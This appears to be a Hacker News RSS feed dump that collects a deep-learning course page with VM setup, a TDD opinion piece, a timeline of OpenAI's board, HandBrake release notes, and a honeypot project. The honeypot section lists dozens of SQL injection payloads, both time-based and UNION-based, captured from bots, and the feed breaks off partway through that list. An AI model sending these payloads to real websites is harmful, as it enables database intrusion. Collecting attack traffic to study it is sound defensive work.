is <span>False</span>, MNIST is used, if it is None, the argument
<span>--cifar</span> is taken into account.</p>

<p>If <span>one_hot_labels</span> is <span>True</span>, the targets are converted to 2d
<span>torch.Tensor</span> with as many columns as there are classes, and
-1 everywhere except the coefficients [n, y_n], equal to 1.</p>

<p>If <span>normalize</span> is <span>True</span>, the data tensors are normalized
according to the mean and variance of the training one.</p>

<p>If <span>flatten</span> is <span>True</span>, the data tensors are flattened
into 2d tensors of dimension N × D, discarding the image structure
of the samples. Otherwise they are 4d tensors of dimension N × C
× H × W.</p>

<h3>Minimal example</h3>

<pre>import dlc_practical_prologue as prologue

train_input, train_target, test_input, test_target = prologue.load_data()

print('train_input', train_input.size(), 'train_target', train_target.size())
print('test_input', test_input.size(), 'test_target', test_target.size())
</pre>

<p>prints</p>

<pre>* Using MNIST
** Reduce the data-set (use --full for the full thing)
** Use 1000 train and 1000 test samples
train_input torch.Size([1000, 784]) train_target torch.Size([1000])
test_input torch.Size([1000, 784]) test_target torch.Size([1000])
</pre>

<!-- ************************************************************ -->
<!-- ************************************************************ -->
<!-- ************************************************************ -->

<h2><a id="vm"></a>Virtual Machine</h2>

<p>A Virtual Machine (VM) is a software that simulates a complete
computer. The one we provide here includes a Linux operating
system and all the tools needed to use PyTorch from a web
browser
(<i>e.g.</i> <a href="https://www.mozilla.org/en-US/firefox/new/">Mozilla
Firefox</a> or <a href="https://www.google.com/chrome/">Google
Chrome</a>).</p>

<h3>Installation</h3>

<ol>
<li>Download and install <a href="https://www.virtualbox.org/wiki/Downloads">Oracle's VirtualBox,</a></li>
<li>download the <a href="https://fleuret.org/dlc/files/dlc-vm.ova">virtual machine OVA package</a> (1.68Gb), and</li>
<li>open the latter in VirtualBox with <span>File → Import Appliance</span>.</li>
</ol>

<p>You should now see an entry in the list of VMs. The first time
it starts, it provides a menu to choose the keyboard layout you
want to use (you can force the configuration later by running
the command <span>sudo set-kbd</span>).</p>

<p><b>If the VM does not start and VirtualBox complains that the
VT-x is not enabled, you have to activate the virtualization
capabilities of your CPU in the BIOS of your computer.</b></p>

<h3><a id="using-the-vm"></a>Using the VM</h3>

<p>The VM automatically starts
a <a href="https://jupyter.org/">JupyterLab</a> on port 8888 and
exports that port to the host. This means that you can access this
JupyterLab with a web browser on the machine running VirtualBox at
<a href="http://localhost:8888/">http://localhost:8888/</a>
and use Python notebooks, view files, start terminals, and edit source
files. Typing <span>!bye</span> in a notebook
or <span>bye</span> in a terminal will shutdown the
VM.</p>

<p>You can run a terminal and a text editor from inside the Jupyter
notebook for exercises that require more than the notebook
itself. Source files can be executed by running in a terminal the
Python command with the source file name as argument. Both can be done
from the main Jupyter window with:</p>

<ul>
<li><span>New → Text File</span> to create
the source code, or selecting the file and
clicking <span>Edit</span> to edit an existing
one.</li>
<li><span>New → Terminal</span> to start a
shell from which you can run Python.</li>
</ul>

<!-- <p><b>Files saved in the VM are erased when the VM is -->
<!-- re-installed, which happens for each session on the EPFL -->
<!-- machines. So you should download files you want to keep from -->
<!-- the Jupyter notebook to your account and re-upload them later -->
<!-- when you need them.</b></p> -->

<p>This VM also exports an ssh port to the port 2022 on the host,
which allows to log in with standard ssh clients on Linux and
OSX, and with applications such
as <a href="https://www.putty.org/">PuTTY</a> on Windows. The
default login is <span>'dave'</span> and
password <span>'dummy'</span>, same password
for the root account.</p>

<h3>Remarks</h3>

<p>Note that performance for computation will be very poor compared to
<a href="https://pytorch.org/get-started/locally/">installing
PyTorch</a> natively on your machine. In particular, the VM does
not take advantage of a GPU if you have one.</p>

<p><b>Finally, please also note that this VM is configured in a
convenient but highly non-secured manner, with easy to guess
passwords, including for the root, and network-accessible
non-protected Jupyter notebooks.</b></p>

<p>This VM is built on
a <a href="https://www.linuxfoundation.org/">Linux</a> <a href="https://www.debian.org/">Debian,</a>
with <a href="https://conda.io/miniconda.html">miniconda,</a>
<a href="https://pytorch.org/">PyTorch,</a> <a href="http://yann.lecun.com/exdb/mnist/">MNIST,</a>
<a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFAR10,</a> and many Python utility packages installed.</p>

<!-- ************************************************************ -->
<!-- ************************************************************ -->
<!-- ************************************************************ -->

<h2><a id="license"></a>License of use</h2>

<p>My own materials on this page are licensed under the
<a href="https://fleuret.org/dlc/by-nc-sa-4.0.txt">Creative Commons BY-NC-SA 4.0
International License.</a></p>

<p>More simply: I am okay with this material being used for
regular academic teaching, but definitely not for a book /
youtube loaded with ads / whatever monetization model I am not
aware of.</p>

<!-- ********************************************************************** -->



<!-- ********************************************************************** -->




</div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Big TDD Misunderstanding (2022) (102 pts)]]></title>
            <link>https://linkedrecords.com/the-big-tdd-misunderstanding-8e22c2f1fc21?gi=61ce87d573e8</link>
            <guid>38330989</guid>
            <pubDate>Sun, 19 Nov 2023 09:48:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://linkedrecords.com/the-big-tdd-misunderstanding-8e22c2f1fc21?gi=61ce87d573e8">https://linkedrecords.com/the-big-tdd-misunderstanding-8e22c2f1fc21?gi=61ce87d573e8</a>, See on <a href="https://news.ycombinator.com/item?id=38330989">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><a rel="noopener  ugc nofollow" href="https://linkedrecords.com/?source=post_page-----8e22c2f1fc21--------------------------------"><div aria-hidden="false"><p><img alt="Oliver Wolf" src="https://miro.medium.com/v2/resize:fill:88:88/1*ptf4iR5duKduhso1V-wQQw.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"></p></div></a></div><p id="d87c"><strong>💡</strong>Originally, the term “unit” in “unit test” referred not to the system under test but to the test itself. This implies that the test can be executed as one unit and does not rely on other tests running upfront (see <a href="https://medium.com/r?url=https%3A%2F%2Ftanzu.vmware.com%2Fcontent%2Fblog%2Fwhat-is-a-unit-test-the-answer-might-surprise-you" rel="noopener">here</a> and <a href="https://www.youtube.com/watch?v=HNjlJpuA5kQ" rel="noopener ugc nofollow" target="_blank">here</a>).</p><p id="e365">However, when people started considering parts of the system under test as the “units”, it significantly affected the quality of test suites (in a bad way). The primary consequence was that the majority began writing one “unit test” for every class or method. The second consequence was the isolation of this “unit” from other “units” using test doubles (mocks).</p><p id="183e"><strong>Now, you change a little thing in your code base, and the only thing the testing suite tells you is that you will be busy the rest of the day rewriting false positive test cases.</strong></p><p id="b238">Unfortunately, the status quo of unit testing is perceived very dogmatic and thinking different is kind of a taboo topic. But maybe it helps when you know that there are actually two main schools when it comes to testing: mockist vs. classicist. Here are my tips on how to write “good” tests, mostly <strong>inspired</strong> by the classicist style. But also keep in mind - in software engineering - there is not good and bad, there is only: does if satisfy <strong>your</strong> requirements.</p><p id="99ce"><strong>Tip #1</strong>: Write the tests from outside in. With this, I mean you should write your tests from a realistic user perspective. To have the best quality assurance and refactor resistance, you would write e2e or integration tests. This can lead to tests that take a long time to execute and increase the feedback loop. You can try to solve this by making the tests independent of each other so they can run in parallel. Originally, the test pyramid forbade a lot of end-to-end and integration tests. Instead, the pyramid says we should write a lot of unit tests, and for most people, a unit is a class. This often leads to an inside-out approach, testing the structure of the system rather than its behavior. Challenge the traditional testing pyramid and think about how much end-to-end integration and unit tests make sense in your context. Also consider more recent alternatives to the test pyramid: “<a href="https://www.oreilly.com/library/view/hands-on-microservices/9781789133608/7c9f1260-b0c5-4416-816f-1cad140b56dd.xhtml" rel="noopener ugc nofollow" target="_blank">Honeycomb</a>” and “<a href="https://twitter.com/kentcdodds/status/960723172591992832" rel="noopener ugc nofollow" target="_blank">The Testing Trophy</a>”.</p><p id="0854"><strong>Tip #2: </strong>Do not isolate code when you test it. If you do so, the tests become fragile and will not help you in case you refactor the software. Only isolate your code from truly external services. Have a look at the port and adapter pattern (aka hexagonal architecture), which is a good starting point for decoupling your “main code” from infrastructure code. If you stub, you stub the infrastructure implementations. Also, consider not stub the infrastructure and using a real database. With tools like Docker, it is not that hard or slow anymore. Also, the more you isolate your “unit” under test, the less meaningful the test coverage report becomes. You just don’t know if your system works as a whole, even though each line is tested. This is especially true for dynamically typed languages.</p><p id="37e5"><strong>Tip #3</strong>: Never change your code without having a red test. This is a pretty common practice in TDD. This has two benefits: 1) It is the tests of the tests itself. When it is red, you know it works. 2) It makes sure you test all scenarios. This, of course, does not apply when you refactor your code.</p><p id="b0c0"><strong>Tip #4:</strong> TDD says the process of writing tests first will/should drive the design of your software. I never understood this. Maybe this works for other people but it does not work for me. It is software architecture 101 — Non-functional requirements (NFR) define your architecture. NFR usually do not play a role when writing unit tests.</p><p id="5bf9">To sum up, in my opinion, the most important decision to make when you start writing automated tests is to decide what trade-off to make. <strong>Do you want a high level of quality assurance, refactor resistance, or a fast feedback loop?</strong> Today, it is often possible to make an e2e test or integration test run fast enough.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A Timeline of the OpenAI Board (186 pts)]]></title>
            <link>https://loeber.substack.com/p/a-timeline-of-the-openai-board</link>
            <guid>38330158</guid>
            <pubDate>Sun, 19 Nov 2023 07:39:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://loeber.substack.com/p/a-timeline-of-the-openai-board">https://loeber.substack.com/p/a-timeline-of-the-openai-board</a>, See on <a href="https://news.ycombinator.com/item?id=38330158">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h4 translated="">Discover more from Loeber on Substack</h4><p>On interactions between people, markets, and technology.</p> </div><div dir="auto"><p><span>Yesterday, Sam Altman and Greg Brockman were fired from the Board of Directors of OpenAI. Following, all of Tech Twitter was abuzz with one question: wait a moment, who was on the Board? And after they found out, they asked: who on earth are </span><a href="https://www.google.com/search?q=tasha+mccauley" rel="nofollow ugc noopener">Tasha McCauley</a><span> and </span><a href="https://cset.georgetown.edu/staff/helen-toner/" rel="nofollow ugc noopener">Helen Toner</a><span>? It turns out that OpenAI’s Board had undergone numerous changes over the years, especially recently. And that just wasn’t ever the biggest news about OpenAI, so those changes didn’t spark the concerns that maybe they should have. </span></p><p><span>I combed through the Internet Archive and OpenAI’s non-profit filings to try to make sense of OpenAI’s governance. Below, I have attempted to chronicle the composition of OpenAI’s Board over time, point out the conflicts, and you can see how we got to the earthquake yesterday. You can </span><a href="https://loeber.substack.com/i/138968534/summaryperspectives" rel="nofollow ugc noopener">skip to the end</a><span> for my summary perspective.</span></p><p>OpenAI is founded.</p><p><span>Board Directors:</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-138968534" href="https://loeber.substack.com/p/a-timeline-of-the-openai-board#footnote-1-138968534" target="_self" rel="nofollow ugc noopener">1</a></span></p><ul><li><p>Elon Musk (Co-Chair)</p></li><li><p>Sam Altman (Co-Chair)</p></li></ul><p><span>OpenAI’s </span><a href="https://projects.propublica.org/nonprofits/organizations/810861541/201703459349300445/full" rel="nofollow ugc noopener">Form 990 public filings</a><span> for calendar year 2016 show the Board Directors:</span></p><ul><li><p>Elon Musk</p></li><li><p>Sam Altman</p></li><li><p>Chris Clark</p></li><li><p>Jonathan Levy (?)</p></li></ul><p>Chris was the initial COO of OpenAI, and still works there to this day. Jonathan Levy was listed as Secretary/Treasurer, and may have been a trustee rather than a Director. It’s unclear from the filings.</p><p><span>Open Philanthropy </span><a href="https://www.goodventures.org/our-portfolio/grants/openai-general-support/" rel="nofollow ugc noopener">donates</a><span> $30M to OpenAI. Holden Karnofsky, the founder of Open Philanthropy, </span><a href="https://www.openphilanthropy.org/grants/openai-general-support/#5-relationship-disclosures" rel="nofollow ugc noopener">joins</a><span> OpenAI’s Board of Directors.</span></p><p><span>OpenAI’s </span><a href="https://projects.propublica.org/nonprofits/organizations/810861541/201920719349300822/full" rel="nofollow ugc noopener">Form 990 public filings</a><span> for calendar year 2017 show the Board Directors: </span></p><ul><li><p>Elon Musk</p></li><li><p>Sam Altman</p></li><li><p>Chris Clark</p></li><li><p>Holden Karnofsky</p></li><li><p>Greg Brockman</p></li><li><p>Ilya Sutskever</p></li></ul><p><span>Elon Musk is removed from the Board. The </span><a href="https://openai.com/blog/openai-supporters" rel="nofollow ugc noopener">official press release</a><span> proclaims a departure to avoid potential conflicts, but </span><a href="https://www.semafor.com/article/03/24/2023/the-secret-history-of-elon-musk-sam-altman-and-openai" rel="nofollow ugc noopener">journalists report</a><span> leadership disagreements culminating in Elon proposing a takeover and being rebuked.</span></p><p>Board Directors:</p><ul><li><p>Greg Brockman</p></li><li><p>Ilya Sutskever</p></li><li><p>Holden Karnofsky</p></li><li><p>Sam Altman</p></li></ul><p>We don’t know exactly when Chris Clark was removed from the Board. </p><p><span>Reid Hoffman, founder of LinkedIn and General Partner at Greylock, joins the Board. I couldn’t find a press release or official announcement, but Reid’s </span><a href="https://www.linkedin.com/in/reidhoffman/details/experience/" rel="nofollow ugc noopener">LinkedIn profile</a><span> has the dates.</span></p><p><span>Adam D’Angelo, CEO of Quora and former Facebook CTO, </span><a href="https://twitter.com/adamdangelo/status/988859015315701760?lang=en" rel="nofollow ugc noopener">joins</a><span> the Board. This follows the February Board changes, where the OpenAI blog post had noted the intent to add another Director to the Board soon.</span></p><p><span>Sue Yoon joins the Board. Sue’s exact employment at the time was unclear — she was previously an EIR at First Round, and in the coming months would lead robotics projects at Google. Similar to Reid Hoffman, I couldn’t find an official announcement, but her </span><a href="https://www.linkedin.com/in/sue-yoon-8b35a214/" rel="nofollow ugc noopener">LinkedIn profile</a><span> has the dates.</span></p><p><span>OpenAI’s </span><a href="https://projects.propublica.org/nonprofits/organizations/810861541/201943199349318399/full" rel="nofollow ugc noopener">Form 990 public filings</a><span> for calendar year 2018 list the Board Directors: </span></p><ul><li><p>Sam Altman</p></li><li><p>Sue Yoon</p></li><li><p>Holden Karnofsky</p></li><li><p>Greg Brockman</p></li><li><p>Ilya Sutskever</p></li><li><p>Adam D’Angelo</p></li><li><p>Tasha McCauley</p></li></ul><p>I could not find anything in the way of a source on when, or under what circumstances, Tasha McCauley joined the Board. </p><p><span>This gets strange. There’s an OpenAI </span><a href="https://openai.com/blog/openai-lp" rel="nofollow ugc noopener">blog post listing the Board Directors</a><span>:</span></p><ul><li><p>Greg Brockman</p></li><li><p>Ilya Sutskever </p></li><li><p>Sam Altman</p></li><li><p>Adam D’Angelo</p></li><li><p>Holden Karnofsky</p></li><li><p>Reid Hoffman</p></li><li><p>Shivon Zilis</p></li><li><p>Tasha&nbsp;McCauley</p></li></ul><p><span>Note the unannounced elevation of Shivon Zilis (previously an advisor) and the unannounced departure of Sue Yoon. Weirder yet, OpenAI published its </span><a href="https://web.archive.org/web/20190311213355/https://openai.com/about/" rel="nofollow ugc noopener">new homepage</a><span> just that day, still listing Sue Yoon as a Board Director, and not Shivon Zilis.</span></p><p><span>Sue Yoon leaves OpenAI’s Board, according to her LinkedIn. The OpenAI Website </span><a href="https://web.archive.org/web/20191201065651/https://openai.com/about/" rel="nofollow ugc noopener">still lists</a><span> her (and not Shivon Zilis) as a Board Director. </span></p><p><span>Another year, another OpenAI </span><a href="https://projects.propublica.org/nonprofits/organizations/810861541/202003219349325305/full" rel="nofollow ugc noopener">Form 990 public filing</a><span>, listing the Board Directors:</span></p><ul><li><p>Ilya Sutskever</p></li><li><p>Greg Brockman</p></li><li><p>Sam Altman</p></li><li><p>Reid Hoffman</p></li><li><p>Sue Yoon</p></li><li><p>Holden Karnofsky</p></li><li><p>Adam D’Angelo</p></li><li><p>Tasha McCauley</p></li></ul><p>Note that Shivon Zilis still doesn’t appear in the list of Board Directors. Was the March 11, 2019 blog post just wrong? Did someone in marketing make a mistake and no-one caught it? </p><p>Slow news year. The Form 990 public filing for calendar year 2020 lists the Board of Directors, finally including Shivon Zilis and not Sue Yoon:</p><ul><li><p>Ilya Sutskever</p></li><li><p>Greg Brockman</p></li><li><p>Sam Altman</p></li><li><p>Reid Hoffman</p></li><li><p>Shivon Zilis</p></li><li><p>Holden Karnofsky</p></li><li><p>Adam D’Angelo</p></li><li><p>Tasha McCauley</p></li></ul><p>I couldn’t find a public statement on when Shivon actually joined the Board, other than the March 2019 blog post that may have been in error. </p><p><span>Will Hurd, Republican member of the House of Representatives, and former CIA agent, </span><a href="https://openai.com/blog/will-hurd-joins" rel="nofollow ugc noopener">joins</a><span> the Board.</span></p><p><span>Helen Toner, Director at Georgetown’s Center for Security and Emerging Technologies, and formerly of Holden Karnofsky’s Open Philanthropy, </span><a href="https://openai.com/blog/helen-toner-joins" rel="nofollow ugc noopener">joins</a><span> the Board. </span></p><p><span>Holden Karnofsky resigns from the Board, </span><a href="https://www.vox.com/future-perfect/2023/3/18/23645013/openai-gpt4-holden-karnofsky-artificial-intelligence-ai-safety-existential-risk" rel="nofollow ugc noopener">citing</a><span> a potential conflict because his wife, Daniela Amodei, is helping start Anthropic, a major OpenAI competitor, with her brother Dario Amodei. (They all live(d) together.) The exact date of Holden’s resignation is unknown; there was no contemporaneous press release.</span></p><p><span>Between October and November 2021, Holden was quietly removed from the list of Board Directors on the OpenAI website, and Helen was added (</span><a href="https://forum.effectivealtruism.org/posts/fmDFytmxwX9qBgcaX/why-aren-t-you-freaking-out-about-openai-at-what-point-would?commentId=KavuL7Q5qdvxoYSsd" rel="nofollow ugc noopener">Discussion Source</a><span>). Given their connection via Open Philanthropy and the fact that Holden’s Board seat appeared to be permanent, it seems that Helen was picked by Holden to take his seat. </span></p><p><span>OpenAI’s </span><a href="https://projects.propublica.org/nonprofits/organizations/810861541/202243199349314989/full" rel="nofollow ugc noopener">Form 990 public filings</a><span> list the Board Directors of the 2021 calendar year: </span></p><ul><li><p>Ilya Sutskever</p></li><li><p>Shivon Zilis</p></li><li><p>Greg Brockman</p></li><li><p>Will Hurd</p></li><li><p>Sam Altman</p></li><li><p>Reid Hoffman</p></li><li><p>Holden Karnofsky</p></li><li><p>Adam D’Angelo</p></li><li><p>Tasha McCauley</p></li><li><p>Helen Toner</p></li></ul><p>The fact that both Holden and Helen are listed here is not surprising; both of them were Board Directors at points in 2021. (It does not necessarily imply that they were both on the Board at the same time.)</p><p>There did not appear to be any Board events in 2022. The Form 990 does not appear to have been filed as of the time of writing.</p><p><span>Reid Hoffman steps down from the Board, </span><a href="https://www.bloomberg.com/news/articles/2023-03-03/linkedin-co-founder-hoffman-stepping-down-from-openai-board" rel="nofollow ugc noopener">citing</a><span> the need to avoid potential conflicts with his investments. While this was reported in March 2023, according to his LinkedIn profile’s dates it happened in January.</span></p><p><span>Shivon Zilis </span><a href="https://www.theinformation.com/articles/shivon-zilis-musk-associate-leaves-openai-board" rel="nofollow ugc noopener">resigns</a><span> from the Board for reasons unknown. (Commentators speculate that her resignation is over conflicts due to her bearing Elon Musk’s children, but that is ultimately just speculation.)</span></p><p><span>Will Hurd </span><a href="https://www.bloomberg.com/news/articles/2023-07-13/republican-presidential-hopeful-will-hurd-leaves-board-of-openai" rel="nofollow ugc noopener">resigns</a><span> from the Board, citing the need to focus on politics/his 2024 Presidential campaign. (Three months later, in October, he drops out of the race. I don’t know what to make of that.)</span></p><p><span>Sam Altman is fired from OpenAI and the OpenAI Board in a surprise meeting of the Board (except Greg). Minutes later, in a </span><a href="https://twitter.com/gdb/status/1725736242137182594" rel="nofollow ugc noopener">separate surprise Board meeting</a><span>, Greg Brockman is removed from the Board (and as Board Chairman).</span></p><p>Board Directors:</p><ul><li><p>Adam D’Angelo</p></li><li><p>Helen Toner</p></li><li><p>Tasha McCauley</p></li><li><p>Ilya Sutskever</p></li></ul><p>The first thing that sticks out to me is that there have been, for several quarters, two significant conflicts of interest on the Board:</p><ul><li><p><span>Adam D’Angelo founded and appears to be spending all his time on developing </span><a href="https://twitter.com/poe_platform" rel="nofollow ugc noopener">Poe</a><span>, an AI chat platform partially leveraging and partially competing with OpenAI. In my opinion, that’s too close. Reid Hoffman resigned over potential indirect investment conflicts; Adam’s conflicts are more direct. Best practice would’ve been for Adam to resign when he began working on Poe.</span></p></li><li><p><span>Helen Toner and and Tasha McCauley are jointly participating in a highly ideological AI governance organization. As Alex Konrad </span><a href="https://www.forbes.com/sites/alexkonrad/2023/11/17/these-are-the-people-that-fired-openai-ceo-sam-altman/?sh=47da17654ae9" rel="nofollow ugc noopener">noted</a><span>: “McCauley currently sits on the advisory board of British-founded international Center for the Governance of AI (GovAI) alongside fellow OpenAI director Helen Toner.” It turns out that the </span><a href="https://www.governance.ai/people" rel="nofollow ugc noopener">advisory board is six people</a><span>, and beyond Helen and Tasha, the other four include: one who currently works for Open Philanthropy, and another is the founder of GovAI, which was mostly funded by… Open Philanthropy. </span></p><ul><li><p>For OpenAI’s six-person Board, it was inappropriate for two Board Directors to be this strongly associated with an ideological organization and therefore so strongly and predictably aligned in their voting. It calls into question the independence of their votes.</p></li><li><p><span>Due to Open Philanthropy’s link to major OpenAI competitor Anthropic, there’s also a hint of corporate conflict here. If I were on OpenAI’s Board, I would have requested at least for Tasha</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-138968534" href="https://loeber.substack.com/p/a-timeline-of-the-openai-board#footnote-2-138968534" target="_self" rel="nofollow ugc noopener">2</a></span><span> to relinquish her seat for a true independent Director.</span></p></li></ul></li></ul><p>Secondly, what the hell happened in Q1/Q2 2023? </p><ul><li><p>Reid, Shivon, and Will all resigned, and the Board did not line up replacement Directors? By comparison, when Elon resigned in February 2018, Adam joined two months later. </p><ul><li><p>Were these seats just left vacant, with a deadlocked Board unable to agree on new Directors to appoint?</p></li></ul></li><li><p>They all resigned within a few months of one another despite OpenAI looking like the rocketship of the century? Something feels a little odd about that.</p></li></ul><p>It seems less likely that the November firings would have happened if Reid, Shivon, and Will — or even just one of them! — had still been on the Board, or replaced with an appropriate representative. With this view, the outcome was almost predictable given these two facts:</p><ol><li><p>The thinning-out of the Board from 9 to 6 members;</p></li><li><p>Half of those 6 members carrying conflicts in their relationship with OpenAI!</p></li></ol><p>We will find out, in due time, the motivations of the Board in the November firings. Right now they aren’t clear. It isn’t known whether anyone acted inappropriately, and I am not accusing anyone (to be clear, even the Board Directors that I consider conflicted) of having acted subject to conflicts of interest. But the 2023 changes made drama likely, no matter what. A Board is a delicate balance of perspectives and interests. When a Board rapidly changes in size, rarely is the remainder left well-balanced. Potential conflicts only make the balancing act harder.</p><p>Governance can be messy. Time will be the judge of whether this act of governance was wise or not. But you should note that the people involved in this act of corporate governance are roughly the same people trying to position themselves to govern policy on artificial intelligence. </p><p><span>It seems much easier to govern a single-digit number of highly capable people than to “govern” artificial superintelligence. If it turns out that this act of governance was unwise, then it calls into serious question the ability of these people and their organizations (Georgetown’s CSET, Open Philanthropy, etc.) to conduct governance in general, </span><em>especially</em><span> of the most impactful technology of the hundred years to come. Many people are saying we need more governance: maybe it turns out we need less.</span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HandBrake 1.7.0 – The open source video transcoder (357 pts)]]></title>
            <link>https://forum.handbrake.fr/viewtopic.php?t=43311</link>
            <guid>38329969</guid>
            <pubDate>Sun, 19 Nov 2023 07:03:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://forum.handbrake.fr/viewtopic.php?t=43311">https://forum.handbrake.fr/viewtopic.php?t=43311</a>, See on <a href="https://news.ycombinator.com/item?id=38329969">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><span>Upgrade Notice</span></p><p>

Before updating HandBrake, <strong><span>please make sure there are no pending encodes in the queue</span></strong>, and be sure to make a backup of any custom presets and app preferences you have, as they may not be compatible with newer versions.</p><p>

Windows users, please make sure to install [Microsoft .NET Desktop Runtime version 6.0.x](<a href="https://dotnet.microsoft.com/en-us/download/dotnet/6.0">https://dotnet.microsoft.com/en-us/download/dotnet/6.0</a>). Read carefully: you need the **DESKTOP** runtime. You must install .NET 6 even if you have installed .NET 7.</p><p>

<span>Release Notes</span><br>
For a full list of improvements and fixes, please see our <a href="https://github.com/HandBrake/HandBrake/releases/tag/1.7.0">release notes on GitHub.</a></p><p>


<span>Reporting Issues or Providing Feedback</span><br>
If you happen to discover any reproducible bugs, issues, or just want to provide feedback, please tell us on our GitHub issue tracker. You can also get in touch on our IRC community support channel.</p><p>

Please be aware, the HandBrake app is built by a very small team of volunteers in our free time. As such, it may not be possible for an immediate response but we do see your comments and welcome constructive feedback!</p><p>

<span>Thanks and Contributing</span><br>
Some of the features in this release have come from HandBrake users or companies. Translations have come from a vibrant community of volunteers throughout the globe. We'd like to thank everyone who contributed!</p><p>

On that note, if you are interested in contributing but don't today, please take a read of our contributing guide. There are many ways you can contribute and you don't need to be a developer to do so.</p><p>



<span>Release Highlights</span></p><p>

<a href="https://handbrake.fr/downloads.php">Download HandBrake 1.7.0</a></p><p>

<a href="https://handbrake.fr/docs">HandBrake 1.7 Documentation</a></p><p>


<a href="https://forum.handbrake.fr/viewtopic.php?t=43312">[ Comment on this Forum ]</a><br>
<a href="https://github.com/HandBrake/HandBrake/discussions/5505">[ Comment on GitHub Discussions ]</a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HoneyPot – I Made a Text Field Only Bots Use – Heres What Happened (153 pts)]]></title>
            <link>https://github.com/lee101/hidden-form-on-the-internet</link>
            <guid>38328907</guid>
            <pubDate>Sun, 19 Nov 2023 04:21:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/lee101/hidden-form-on-the-internet">https://github.com/lee101/hidden-form-on-the-internet</a>, See on <a href="https://news.ycombinator.com/item?id=38328907">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-snippet-clipboard-copy-content="1%' AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113))) AND '%'='
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ASOr
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1%' AND SLEEP(5) AND '%'='
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rOre
1 UNION ALL SELECT NULL,NULL,NULL#
1') AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113))) AND ('Tpez'='Tpez
1%' UNION ALL SELECT NULL,NULL-- Yiqi
-1928) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x66796551546c4c427073,0x716b767071)#
-7730) UNION ALL SELECT NULL,CONCAT(0x71626a7a71,0x4f765a4a57785671556957694d75516568647a456d656f4259786c4a797370706271537345716d70,0x716b767071),NULL,NULL,NULL,NULL,NULL#
wrBEIRqX&quot; AND 2*3*8=6*8 AND &quot;yIOj&quot;=&quot;yIOj
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Cwml
1' UNION ALL SELECT NULL-- SYro
1' UNION ALL SELECT NULL,NULL,NULL,NULL#
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- diBB
1) AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5) AND (3100=3100
1' UNION ALL SELECT NULL,NULL-- RIna
1) UNION ALL SELECT 84,84,84,84,84,CONCAT(0x71626a7a71,0x53624857707a6d5570666852696a4d5a796f586262664c4969495a784959715a6a766241624a7772,0x716b767071),84#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
1';SELECT SLEEP(5)#
x2akMEYO' OR 853=(SELECT 853 FROM PG_SLEEP(15))--
1') AND 5484=5484 AND ('cspH'='cspH
-6748) UNION ALL SELECT CONCAT(0x71626a7a71,0x61706e684a5371736a4157685a566164417274754c564f57514d47775851736268725973756a767a,0x716b767071),84,84,84,84,84,84#
1 AND 4359=3133-- FVJr
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
1';WAITFOR DELAY '0:0:5'--
1 UNION ALL SELECT NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jHgB
0&quot;XOR(if(now()=sysdate(),sleep(15),0))XOR&quot;Z
1') AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND ('jIWd'='jIWd
1') UNION ALL SELECT NULL,NULL#
HTcKUEXA
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1%' AND 5484=5484 AND '%'='
1' AND 4713=(SELECT 4713 FROM PG_SLEEP(5)) AND 'krGd'='krGd
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TCPs
1' UNION ALL SELECT NULL,NULL,NULL-- BiPU
